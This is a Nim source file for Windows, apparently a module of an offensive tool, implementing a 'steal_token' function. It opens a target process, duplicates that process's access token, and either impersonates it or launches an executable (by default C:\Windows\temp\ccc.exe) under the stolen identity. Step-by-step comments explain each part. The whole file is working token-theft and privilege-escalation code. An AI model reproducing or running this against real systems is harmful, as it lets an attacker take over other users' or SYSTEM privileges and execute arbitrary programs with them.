import winim/lean
import winim/winstr
import ../utils/utils
import ../utils/winapi_wrapper

proc steal_token*(rpid: int, impersonateOnTheFly: bool = false, outToken: ptr HANDLE = NULL, procToRun: wstring = L"C:\\Windows\\temp\\ccc.exe"):  bool {.cdecl gcsafe.} =

  var
    status: NTSTATUS
    bStatus: BOOL
    processHandle: HANDLE
    tokenHandle: HANDLE
    dupTokenHandle: HANDLE
    clientId: CLIENT_ID             # required for NtOpenProcess
    attributes: OBJECT_ATTRIBUTES   # required for NtOpenProcess

    startupInfo: STARTUPINFO
    processInformation: PROCESS_INFORMATION

  # initialize the STARTUPINFO Struct
  startupInfo.cb = cast[DWORD](sizeof(STARTUPINFO))

  # get the PID of the process
  #let pid = GetProcessByName(process)

  # set in the `CLIENT_ID` field
  clientId.UniqueProcess = cast[DWORD](rpid)

  #[
    Step 1:
    Opening the target process. This can be done with either
    - PROCESS_QUERY_INFORMATION
    - PROCESS_QUERY_LIMITED_INFORMATION
    - PROCESS_ALL_ACCESS
  ]#

  status = wNtOpenProcess(addr processHandle, PROCESS_QUERY_INFORMATION, addr attributes, addr client_id)

  if status == 0:
    DBG("[+] NtOpenProcess() succesfull [Handle: " & $processHandle & "]")
  else:
    DBG("[-] NtOpenProcess() failed")
    return false

  #[
    Step 2:
    Using the Handle with the API Call `OpenProcessToken()` to
    obtain a Handle to the Token of the Process. Access rights are:
    - TOKEN_QUERY
    - TOKEN_DUPLICATE
  ]#


  bStatus = OpenProcessToken(processHandle, TOKEN_QUERY or TOKEN_DUPLICATE, addr tokenHandle)

  if bStatus:
    DBG("[+] OpenProcessToken() succesfull [Handle: " & $tokenHandle & "]")
  else:
    DBG("[-] OpenProcessToken() failed")
    return false


  # if this option is set,
  # then the current thread is going
  # to use the new token by calling `ImpersonatedLoggedOnUser`
  if impersonateOnTheFly:
    bStatus = ImpersonateLoggedOnUser(tokenHandle)
    outToken[] = tokenHandle

    if bStatus:
      DBG("[+] ImpersonateLoggedOnUser() succesfull [Handle: " & $tokenHandle & "]")
      return true
    else:
      DBG("[-] ImpersonateLoggedOnUser() failed")
      return false


  #[
    Step 3:
    The next step is to duplicate the token
    so that it can be reused for spawning a new process.
    The following access rights are required for it to be usable with
    CreateProcess():
    - TOKEN_ADJUST_DEFAULT
    - TOKEN_ADJUST_SESSIONID
    - TOKEN_QUERY
    - TOKEN_DUPLICATE
    - TOKEN_ASSIGN_PRIMARY

  ]#


  bStatus = DuplicateTokenEx(
    tokenHandle,
    TOKEN_ADJUST_DEFAULT or TOKEN_ADJUST_SESSIONID or TOKEN_QUERY or TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY,
    NULL,
    securityImpersonation,
    tokenPrimary,
    addr dupTokenHandle)


  if bStatus:
    DBG("[+] DuplicateTokenEx() succesfull [Handle: " & $dupTokenHandle & "]")
  else:
    DBG("[-] DuplicateTokenEx() failed")
    return false

  #[
    Step 4:
    The last part is to use the duplicated Token to spawn a new
    process that should be run under that privs.
  ]#


  bStatus = CreateProcessWithTokenW(dupTokenHandle, LOGON_WITH_PROFILE, procToRun, NULL, 0, NULL, NULL, addr startupInfo, addr processInformation);

  if bStatus:
    DBG("[+] CreateProcessWithTokenW() succesfull [Handle: " & $dupTokenHandle & "]")
  else:
    DBG("[-] CreateProcessWithTokenW() failed [Error: " & $GetLastError() & "]")
    return false


  # Clean up the Handles
  CloseHandle(processHandle)
  CloseHandle(tokenHandle)
  CloseHandle(dupTokenHandle)

  return true

